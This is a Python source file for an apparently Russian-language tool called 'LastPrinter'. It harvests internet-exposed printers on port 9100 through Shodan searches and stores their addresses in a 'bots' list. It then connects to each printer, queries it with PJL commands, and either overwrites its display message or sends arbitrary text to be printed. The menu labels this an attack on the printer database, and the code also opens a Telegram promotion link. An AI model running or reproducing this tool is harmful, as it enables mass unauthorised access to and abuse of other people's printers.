#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socks, socket
from sys import argv,exit
from os import system,name
from colorama import init,Fore
from time import sleep
from loguru import logger
from shodan import Shodan




class Menu:
    def __init__(self) -> None:
        self.banner = '''
 _               _  ______     _       _            
| |             | | | ___ \   (_)     | |           
| |     __ _ ___| |_| |_/ / __ _ _ __ | |_ ___ _ __ 
| |    / _` / __| __|  __/ '__| | '_ \| __/ _ \ '__|
| |___| (_| \__ \ |_| |  | |  | | | | | ||  __/ |   
\_____/\__,_|___/\__\_|  |_|  |_|_| |_|\__\___|_|   
                '''
        self.filename = 'bots.txt'
        self.link = 'https://t.me/milf_soft'

        with open('bots.txt', 'r') as list_:
            self.ips = []
            lines = list_.readlines()
            for line in lines:
                self.ips.append(line.replace(' ','').replace('\n',''))
        init()
        system(f'termux-open-url {self.link}')
        if len(argv) >1:
            self.token = argv[2] if len(argv) == 1 else argv[3]
    
    def clear(self):
        system('cls' if name == 'nt' else 'clear')

    def printer(self,id_printer:str):
        if id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '').startswith('DISPLAY'): return False
        else: return id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '')

    @logger.catch
    def connect(self,ip, raw):

        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)

        logger.info("[{ip}] Подключение ...",ip=ip)
        try:
            s.connect((ip, 9100))
        except Exception:
            logger.error("[{ip}] Ошибка подключения",ip=ip)
            return 0
        logger.success("[{ip}] Подключен!",ip=ip)

        logger.info("[{ip}] Тестирование PJL",ip=ip)
        s.send(('@PJL INFO STATUS\n').encode('utf-8'))
        try:
            recv = s.recv(1024)
            recv = recv.decode('utf-8')
        except socket.timeout:
            recv = ''

        if recv.startswith('@'):
            logger.info("[{ip}] Тест завершен!",ip=ip)

            s.send(('@PJL INFO ID\n').encode('utf-8'))
            id_printer = s.recv(1024).decode('utf-8')

            if not self.printer(id_printer):
                logger.error("[{ip}] Не удалось получить имя принтера",ip=ip)
            else:
                logger.success("[{ip}] {name}",ip=ip,name=self.printer(id_printer))

            logger.info("[{ip}] Печать сообщения: {mess}",ip=ip,mess=raw)
            s.send(('@PJL RDYMSG DISPLAY="{}"\n'.format(raw)).encode('utf-8'))

            logger.success("[{ip}] Успешно!. Закрытие соединения ",ip=ip)
            s.close()
        elif recv == '':
            logger.info("[{ip}] Обнаружен протокол RAW. Отправка файла",ip=ip)
            try:
                s.send(raw.encode('utf-8'))
            except:
                pass
            logger.success("[{ip}] Успешно!. Закрытие соединения ",ip=ip)
            s.close()
        else:
            logger.error("[{ip}] Протокол не поддерживается. Закрытие соединения ",ip=ip)
            s.close()

    def go_send(self,text):
        for ip in self.ips:
            self.connect(ip,text)
    
    def check_token(self,token):
        api = Shodan(token)
        try:
            results = api.search('port:9100 pjl')
        except:
            print(f'{Fore.LIGHTRED_EX}Токен не валидный используйте другой {Fore.RESET}')
            return

        with open(self.filename, 'a') as file2:
            for result in results['matches']:
                file2.write(result['ip_str'] + "\n")
            print(f'{Fore.LIGHTRED_EX}[~] Файл записан: ./bots.txt {Fore.RESET}')
            file2.close()
    
    @logger.catch
    def parse_argv(self,query):
        self.clear()
        print(Fore.LIGHTRED_EX,self.banner,Fore.RESET)
        try:
            query = int(query)
        except:
            print(f'{Fore.LIGHTRED_EX} Пожалуйста введите число {Fore.RESET}')
            sleep(3)
            self.clear()

        if query == 1:
            print(f'{Fore.LIGHTRED_EX}Введите текст для печати {Fore.RESET}')
            text = input('# ')
            self.go_send(text)
        elif query == 2:
            print(f'{Fore.LIGHTRED_EX}Введите shodan premium ключ {Fore.RESET}')
            token = input('# ')
            self.check_token(token)
            sleep(3)
            self.clear()

        elif query == 3:
            exit()
        else:
            pass
        
    def main_loop(self):
        print(Fore.LIGHTRED_EX,self.banner,Fore.RESET)

        while True:
            print(f'\n\n{Fore.LIGHTRED_EX}Меню LastPrinter (при поддержке t.me/milf_soft):\n\n[1] - начать атаку по готовой базе принтеров\n[2] - обновить базу принтеров (необходим Shodan-key)\n[3] - выход {Fore.RESET}')
            try:
                self.parse_argv(input('\n\n# '))
            except KeyboardInterrupt:
                print(f'{Fore.LIGHTGREEN_EX}Досвидания')
                system(f'termux-open-url {self.link}')
                exit()

if __name__ == '__main__':
    _ = Menu()
    _.main_loop()